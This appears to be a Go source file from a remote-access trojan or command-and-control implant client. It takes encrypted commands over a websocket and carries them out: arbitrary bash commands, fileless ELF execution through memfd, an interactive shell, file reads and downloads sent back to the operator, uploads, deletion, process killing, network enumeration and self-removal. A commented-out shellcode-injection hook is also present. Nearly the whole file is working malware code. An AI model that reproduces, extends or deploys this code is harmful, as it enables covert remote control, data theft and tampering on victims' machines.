package HandlePacket

import (
	"bufio"
	"fmt"
	"io/ioutil"

	"main/Encrypt"
	"main/Helper"
	"main/MessagePack"
	"main/PcInfo"
	"main/util"
	"main/util/setchannel"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/togettoyou/wsc"
)

func SendData(data []byte, Connection *wsc.Wsc) {
	endata, err := Encrypt.Encrypt(data)
	if err != nil {
		return
	}
	Connection.SendBinaryMessage(endata)
}
func SessionLog(log string, Connection *wsc.Wsc, unmsgpack MessagePack.MsgPack) {
	result := ""
	result = string(log)
	utf8Stdout, err := Helper.ConvertGBKToUTF8(result)
	if err != nil {
		//Log(err.Error(), Connection, *unmsgpack)
		utf8Stdout = err.Error()
	}
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("BackSession")
	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
	msgpack.ForcePathObject("Domain").SetAsString("")
	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
	msgpack.ForcePathObject("ProcessIDClientHWID").SetAsString(PcInfo.GetProcessID() + PcInfo.GetHWID())
	msgpack.ForcePathObject("ReadInput").SetAsString(utf8Stdout)
	SendData(msgpack.Encode2Bytes(), Connection)

}

func Read(Data []byte, Connection *wsc.Wsc) {
	unmsgpack := new(MessagePack.MsgPack)
	deData, err := Encrypt.Decrypt(Data)
	if err != nil {
		return
	}
	unmsgpack.DecodeFromBytes(deData)
	//fmt.Print(string(deData))
	switch unmsgpack.ForcePathObject("Pac_ket").GetAsString() {

	case "OSshell":
		go func() {
			cmd := exec.Command("bash", "-c", unmsgpack.ForcePathObject("Command").GetAsString())
			result := ""
			output, err := cmd.Output()
			if err != nil {
				//Log(err.Error(), Connection, *unmsgpack)
				result = err.Error()
			}
			result = string(output)
			msgpack := new(MessagePack.MsgPack)
			msgpack.ForcePathObject("Pac_ket").SetAsString("BackSession")
			msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
			msgpack.ForcePathObject("Domain").SetAsString("")
			msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
			msgpack.ForcePathObject("ProcessIDClientHWID").SetAsString(PcInfo.GetProcessID() + PcInfo.GetHWID())
			msgpack.ForcePathObject("ReadInput").SetAsString(result)
			SendData(msgpack.Encode2Bytes(), Connection)
		}()

	case "GetCurrentPath":
		result, err := listDir("./")
		if err != nil {
			//fmt.Printf("Error: %s\n", err)
			SessionLog(err.Error(), Connection, *unmsgpack)
			return
		}

		msgpack := new(MessagePack.MsgPack)
		msgpack.ForcePathObject("Pac_ket").SetAsString("GetCurrentPath")
		msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
		msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
		msgpack.ForcePathObject(("CurrentPath")).SetAsString(PcInfo.GetCurrentDirectory())
		msgpack.ForcePathObject("File").SetAsString(result)
		msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
		SendData(msgpack.Encode2Bytes(), Connection)

		//fmt.Println(result)

	case "getPath":
		var FilePath = ""
		switch unmsgpack.ForcePathObject("PathType").GetAsString() {
		case "ParentPath":
			{
				exe, err := os.Executable()
				if err != nil {
					SessionLog(err.Error(), Connection, *unmsgpack)
				}

				// 使用filepath.Dir获取exe的父目录
				filepath.Dir(exe)
				//fmt.Println("Executable Path:", exePath)

				// 再次使用filepath.Dir获取父目录
				FilePath = filepath.Dir(unmsgpack.ForcePathObject("Path").GetAsString())
				fmt.Println(FilePath)
			}
		case "RootPath":
			{
				wd, err := os.Getwd()
				if err != nil {
					//fmt.Println("Error:", err)
					SessionLog(err.Error(), Connection, *unmsgpack)

					return
				}

				// 获取卷名
				volName := filepath.VolumeName(wd)
				if volName == "" {
					//fmt.Println("Root directory:", "/")
					FilePath = "/"
				} else {
					//fmt.Println("Root directory:", volName+"\\")
					FilePath = volName + "//"
				}
			}
		default:
			{
				FilePath = unmsgpack.ForcePathObject("Path").GetAsString()
			}
		}
		FilePathA := strings.Replace(FilePath, "\\", "/", -1)
		//fmt.Println(FilePathA)
		result, err := listDir(FilePathA)
		if err != nil {
			SessionLog(err.Error(), Connection, *unmsgpack)
			return
		}
		//fmt.Println("calc")
		msgpack := new(MessagePack.MsgPack)
		msgpack.ForcePathObject("Pac_ket").SetAsString("GetCurrentPath")
		msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
		msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
		msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
		msgpack.ForcePathObject(("CurrentPath")).SetAsString(FilePathA)

		msgpack.ForcePathObject("File").SetAsString(result)
		SendData(msgpack.Encode2Bytes(), Connection)

	case "execute":
		//Args := unmsgpack.ForcePathObject("Args").GetAsString()
		cmd := exec.Command(unmsgpack.ForcePathObject("ExecFilePath").GetAsString())
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Start()

	case "process":
		msgpack := new(MessagePack.MsgPack)
		msgpack.ForcePathObject("Pac_ket").SetAsString("process")
		msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
		//fmt.Println((unmsgpack.ForcePathObject("HWID").GetAsString()))
		msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
		msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
		msgpack.ForcePathObject("Message").SetAsString(listAllProcessInfo())
		//fmt.Println(listAllProcessInfo())
		SendData(msgpack.Encode2Bytes(), Connection)

	case "ProcessKill":

		PID := unmsgpack.ForcePathObject("PID").GetAsString()
		pid, err := strconv.Atoi(PID)

		killProcess(pid)
		if err != nil {
			SessionLog(err.Error(), Connection, *unmsgpack)
		} else {
			//Log("Process %d killed.\n", Connection)
		}

		msgpack := new(MessagePack.MsgPack)
		msgpack.ForcePathObject("Pac_ket").SetAsString("process")
		msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
		msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
		msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
		msgpack.ForcePathObject("ProcessInfo").SetAsString(listAllProcessInfo())
		//fmt.Println(listAllProcessInfo())
		SendData(msgpack.Encode2Bytes(), Connection)

	case "FileRead":

		// 假设这是从unmsgpack获取的路径字符串
		// 获取原始路径字符串
		pathStr := unmsgpack.ForcePathObject("Path").GetAsString()

		// 将所有的反斜杠替换为斜杠
		normalizedPathStr := strings.ReplaceAll(pathStr, "\\", "/")

		// 现在normalizedPathStr包含了替换后的路径
		str, err := readFileToString(normalizedPathStr)

		if err != nil {
			SessionLog(err.Error(), Connection, *unmsgpack)
			return
		}
		msgpack := new(MessagePack.MsgPack)
		msgpack.ForcePathObject("Pac_ket").SetAsString("FileContext")
		msgpack.ForcePathObject("FileName").SetAsString(unmsgpack.ForcePathObject("FileName").GetAsString())
		msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
		msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
		msgpack.ForcePathObject("ReadInput").SetAsString(str)
		msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())

		SendData(msgpack.Encode2Bytes(), Connection)

	case "deleteFile":

		fullPath := unmsgpack.ForcePathObject("FilePath").GetAsString()
		Path := strings.ReplaceAll(unmsgpack.ForcePathObject("Path").GetAsString(), "\\", "/")
		// 将所有的反斜杠替换为斜杠
		normalizedPathStr := strings.ReplaceAll(fullPath, "\\", "/")
		err := DeleteFile(normalizedPathStr)
		if err != nil {
			//fmt.Printf("Error: %s\n", err)
			SessionLog(err.Error(), Connection, *unmsgpack)

		} else {
			//fmt.Println("File deleted successfully")
		}

		result, err := listDir(Path)
		if err != nil {
			fmt.Printf("Error: %s\n", err)
			return
		}
		//fmt.Println("calc")
		msgpack := new(MessagePack.MsgPack)
		msgpack.ForcePathObject("Pac_ket").SetAsString("GetCurrentPath")
		msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
		msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
		msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
		msgpack.ForcePathObject("File").SetAsString(result)
		msgpack.ForcePathObject(("CurrentPath")).SetAsString(Path)
		SendData(msgpack.Encode2Bytes(), Connection)
	case "cutFile":

		pathStr := unmsgpack.ForcePathObject("Path").GetAsString()

		// 将所有的反斜杠替换为斜杠
		normalizedPathStr := strings.ReplaceAll(pathStr, "\\", "/")

		CutFile(strings.ReplaceAll(unmsgpack.ForcePathObject("CopyFilePath").GetAsString(), "\\", "/"), strings.ReplaceAll(unmsgpack.ForcePathObject("PasteFilePath").GetAsString(), "\\", "/"))
		result, err := listDir(normalizedPathStr)
		if err != nil {
			fmt.Printf("Error: %s\n", err)
			result = err.Error()
			return
		}

		msgpack := new(MessagePack.MsgPack)
		msgpack.ForcePathObject("Pac_ket").SetAsString("GetCurrentPath")
		msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
		msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
		msgpack.ForcePathObject(("CurrentPath")).SetAsString(normalizedPathStr)
		msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
		msgpack.ForcePathObject("File").SetAsString(result)
		SendData(msgpack.Encode2Bytes(), Connection)
	case "pasteFile":
		PasteFile(unmsgpack.ForcePathObject("CopyFilePath").GetAsString(), unmsgpack.ForcePathObject("PasteFilePath").GetAsString())
		result, err := listDir(unmsgpack.ForcePathObject("Path").GetAsString())
		if err != nil {
			fmt.Printf("Error: %s\n", err)
			result = err.Error()
			return
		}
		//fmt.Println("calc")
		msgpack := new(MessagePack.MsgPack)
		msgpack.ForcePathObject("Pac_ket").SetAsString("GetCurrentPath")
		msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
		msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
		msgpack.ForcePathObject(("CurrentPath")).SetAsString(unmsgpack.ForcePathObject("Path").GetAsString())
		msgpack.ForcePathObject("File").SetAsString(result)
		msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
		SendData(msgpack.Encode2Bytes(), Connection)

	case "UploadFile":

		fullPath := filepath.Join(unmsgpack.ForcePathObject("UploaFilePath").GetAsString(), unmsgpack.ForcePathObject("Name").GetAsString())

		// 将所有的反斜杠替换为斜杠
		normalizedPathStr := strings.ReplaceAll(fullPath, "\\", "/")
		err := ioutil.WriteFile(normalizedPathStr, unmsgpack.ForcePathObject("File").GetAsBytes(), 0644)
		if err != nil {
			SessionLog("File writing failed! , please elevate privileges", Connection, *unmsgpack)
		}
		result, err := listDir(unmsgpack.ForcePathObject("UploaFilePath").GetAsString())
		if err != nil {
			SessionLog(err.Error(), Connection, *unmsgpack)

			return
		}
		msgpack := new(MessagePack.MsgPack)
		msgpack.ForcePathObject("Pac_ket").SetAsString("GetCurrentPath")
		msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
		msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
		msgpack.ForcePathObject(("CurrentPath")).SetAsString(unmsgpack.ForcePathObject("UploaFilePath").GetAsString())
		msgpack.ForcePathObject("File").SetAsString(result)
		msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
		SendData(msgpack.Encode2Bytes(), Connection)

	case "downloadFile":
		{
			FilePath := unmsgpack.ForcePathObject("FilePath").GetAsString()
			// 将所有的反斜杠替换为斜杠
			normalizedPathStr := strings.ReplaceAll(FilePath, "\\", "/")
			//println(normalizedPathStr)
			// 读取文件到字节数组
			data, err := ioutil.ReadFile(normalizedPathStr)
			if err != nil {

				msgpack := new(MessagePack.MsgPack)
				msgpack.ForcePathObject("Pac_ket").SetAsString("fileError")
				msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
				msgpack.ForcePathObject("DWID").SetAsString(unmsgpack.ForcePathObject("DWID").GetAsString())
				msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
				msgpack.ForcePathObject("Message").SetAsString(err.Error())
				msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
				SendData(msgpack.Encode2Bytes(), Connection)

			} else {
				msgpack := new(MessagePack.MsgPack)
				msgpack.ForcePathObject("Pac_ket").SetAsString("fileDownload")
				msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
				msgpack.ForcePathObject("DWID").SetAsString(unmsgpack.ForcePathObject("DWID").GetAsString())
				msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
				msgpack.ForcePathObject("FileName").SetAsString(unmsgpack.ForcePathObject("FileName").GetAsString())
				msgpack.ForcePathObject(("Data")).SetAsBytes(data)
				msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
				//Log(PcInfo.GetHWID()+":download successful", Connection, *unmsgpack)
				SendData(msgpack.Encode2Bytes(), Connection)
			}
		}

	case "NewFolder":
		err := os.MkdirAll(unmsgpack.ForcePathObject("NewFolderName").GetAsString(), 0755)
		if err != nil {
			fmt.Printf("Error creating directory: %v\n", err)
		}

		result, err := listDir(unmsgpack.ForcePathObject("FileDir").GetAsString())
		if err != nil {
			fmt.Printf("Error: %s\n", err)
			result = err.Error()
			return
		}
		//fmt.Println("calc")
		msgpack := new(MessagePack.MsgPack)
		msgpack.ForcePathObject("Pac_ket").SetAsString("GetCurrentPath")
		msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
		msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
		msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
		msgpack.ForcePathObject(("CurrentPath")).SetAsString(unmsgpack.ForcePathObject("FileDir").GetAsString())
		msgpack.ForcePathObject("File").SetAsString(result)
		SendData(msgpack.Encode2Bytes(), Connection)

	case "NewFile":
		file, err := os.Create(unmsgpack.ForcePathObject("NewFileName").GetAsString())
		if err != nil {
			SessionLog(err.Error(), Connection, *unmsgpack)
			return
		}
		defer file.Close()

		//fmt.Println("File created successfully!")

		result, err := listDir(unmsgpack.ForcePathObject("FileDir").GetAsString())
		if err != nil {
			SessionLog(err.Error(), Connection, *unmsgpack)
			return
		}
		//fmt.Println("calc")
		msgpack := new(MessagePack.MsgPack)
		msgpack.ForcePathObject("Pac_ket").SetAsString("GetCurrentPath")
		msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
		msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
		msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
		msgpack.ForcePathObject(("CurrentPath")).SetAsString(unmsgpack.ForcePathObject("FileDir").GetAsString())
		msgpack.ForcePathObject("File").SetAsString(result)
		SendData(msgpack.Encode2Bytes(), Connection)

	case "ZIP":
		{
			filename := unmsgpack.ForcePathObject("FileName").GetAsString()
			err := Zip(filename, filename+".zip")
			if err != nil {
				SessionLog(err.Error(), Connection, *unmsgpack)
			}
		}
	case "UNZIP":
		{
			filename := unmsgpack.ForcePathObject("FileName").GetAsString()
			if !strings.HasSuffix(filename, ".zip") {
				SessionLog("FileName does not end with .zip", Connection, *unmsgpack)
				return
			}
			err := Unzip(filename, strings.ReplaceAll(filename, ".zip", ""))
			if err != nil {
				SessionLog((err.Error()), Connection, *unmsgpack)
			}

		}

	// case "ProcessMove":
	// 	sc := unmsgpack.ForcePathObject("Bin").GetAsBytes()
	// 	pid, _ := strconv.Atoi(unmsgpack.ForcePathObject("PID").GetAsString())
	// 	ShellcodeInjector(sc, pid)

	case "memfd":
		go func() { //Async memfd Thread
			elf := unmsgpack.ForcePathObject("Bin").GetAsBytes()
			args := util.SplitString(unmsgpack.ForcePathObject("Args").GetAsString())
			stdout, stderr := MemfdShellA(elf, args, "/bin/bash")
			if stdout == "" {
				stdout = stderr
			}
			fmt.Println(stdout)
			msgpack := new(MessagePack.MsgPack)
			msgpack.ForcePathObject("Pac_ket").SetAsString("BackSession")
			msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
			msgpack.ForcePathObject("Domain").SetAsString("")
			msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
			msgpack.ForcePathObject("ProcessIDClientHWID").SetAsString(PcInfo.GetProcessID() + PcInfo.GetHWID())
			msgpack.ForcePathObject("ReadInput").SetAsString(stdout)
			SendData(msgpack.Encode2Bytes(), Connection)
		}() //

	case "NetWork":
		{
			msgpack := new(MessagePack.MsgPack)
			msgpack.ForcePathObject("Pac_ket").SetAsString("NetWorkInfo")
			msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
			msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
			msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
			msgpack.ForcePathObject("NetWorkInfoList").SetAsString(Network())
			SendData(msgpack.Encode2Bytes(), Connection)

		}

	case "NoteAdd":
		{
			PcInfo.RemarkContext = unmsgpack.ForcePathObject("RemarkContext").GetAsString()
			PcInfo.RemarkColor = unmsgpack.ForcePathObject("RemarkColor").GetAsString()
			//fmt.Println(PcInfo.RemarkContext + PcInfo.RemarkColor)
		}
	case "Group":
		{
			PcInfo.GroupInfo = unmsgpack.ForcePathObject("GroupInfo").GetAsString()

			//fmt.Println(PcInfo.RemarkContext + PcInfo.RemarkColor)
		}

	case "option":
		{
			switch unmsgpack.ForcePathObject("Command").GetAsString() {
			case "Disconnnect":
				{
					os.Exit(1)
				}

			}
		}

	case "ClientUnstaller":
		{
			exe, err := os.Executable()
			if err != nil {
				panic(err)
			}
			//fmt.Println(exe)
			DeleteFile(exe)
			os.Exit(1)
		}
	case "ClientReboot":
		{
			exe, err := os.Executable()
			if err != nil {

			}
			cmd := exec.Command(exe)
			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr
			err = cmd.Start()

			os.Exit(0)

		}
	case "execPty":
		{
			//fmt.Println(unmsgpack.ForcePathObject("Controler_HWID").GetAsString())
			go PtyCmd(unmsgpack.ForcePathObject("Controler_HWID").GetAsString(), Connection)
			break
		}

	case "ptyData":
		{
			//fmt.Println(unmsgpack.ForcePathObject("Command").GetAsString())
			sendUserId := unmsgpack.ForcePathObject("Controler_HWID").GetAsString()
			m, exist := setchannel.GetPtyDataChan(sendUserId)
			if !exist {
				m = make(chan interface{})
				setchannel.AddPtyDataChan(sendUserId, m)
			}
			m <- []byte(strings.Replace(unmsgpack.ForcePathObject("Command").GetAsString(), "\r\n", "", -1) + "\n")
			return
		}
	}
}

func deleteStringFromFile(filePath, strToDelete string) error {
	file, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		// 删掉含有指定字符串的整行
		if !strings.Contains(line, strToDelete) {
			lines = append(lines, line)
		}
	}
	if err := scanner.Err(); err != nil {
		return err
	}
	output := strings.Join(lines, "\n")
	err = ioutil.WriteFile(filePath, []byte(output), 0644)
	if err != nil {
		return err
	}
	return nil
}

func containsStringInFile(filePath, searchStr string) (bool, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return false, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		if strings.Contains(scanner.Text(), searchStr) {
			return true, nil
		}
	}

	if err := scanner.Err(); err != nil {
		return false, err
	}

	return false, nil
}

func checkStringInDirectoryFile(filePath, searchString string) bool {
	res, err := containsStringInFile(filePath, searchString)
	if err != nil {
		//fmt.Println("Error reading file:", filePath, err)
		return false
	}
	return res
}
